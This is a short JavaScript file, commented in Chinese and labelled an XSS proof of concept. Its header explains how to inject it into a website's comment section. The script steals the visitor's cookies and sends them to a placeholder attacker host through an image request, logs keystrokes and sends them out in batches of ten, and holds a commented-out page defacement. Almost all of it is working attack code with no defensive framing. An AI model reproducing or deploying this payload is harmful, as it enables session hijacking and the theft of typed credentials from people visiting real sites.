// XSS 攻击 PoC - JavaScript 劫持脚本
// 使用方式：在评论区注入 <script src="http://127.0.0.1:8081/xss_poc.js"></script>

(function() {
    // 1. 窃取 Cookie
    var cookie = document.cookie;
    var img = new Image();
    img.src = 'http://攻击者IP:端口/steal?cookie=' + encodeURIComponent(cookie);

    // 2. 劫持页面内容
    // document.body.innerHTML = '<h1>页面已被劫持</h1><p>所有用户数据已泄露</p>';

    // 3. 键盘记录
    var keys = [];
    document.addEventListener('keydown', function(e) {
        keys.push(e.key);
        if (keys.length >= 10) {
            new Image().src = 'http://攻击者IP:端口/keys?data=' + encodeURIComponent(keys.join(''));
            keys.length = 0;
        }
    });

    // 4. 截图通知
    console.log('[XSS-PoC] 劫持脚本已执行');
})();
